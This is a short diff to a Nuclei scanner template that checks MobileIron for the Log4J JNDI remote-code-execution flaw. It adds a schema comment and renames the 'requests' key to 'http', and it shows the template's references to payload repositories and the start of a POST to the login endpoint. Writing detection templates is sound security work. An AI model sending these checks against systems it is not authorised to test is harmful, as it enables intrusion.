@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: mobileiron-log4j-jndi-rce
 info:
   name: MobileIron Log4J JNDI RCE
@@ -10,7 +11,7 @@ info:
     - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
     - https://github.com/rwincey/CVE-2021-44228-Log4j-Payloads/blob/main/MobileIron
   tags: rce,jndi,oast,log4j,mobileiron
-requests:
+http:
   - raw:
       - |
         POST /mifs/j_spring_security_check HTTP/1.1
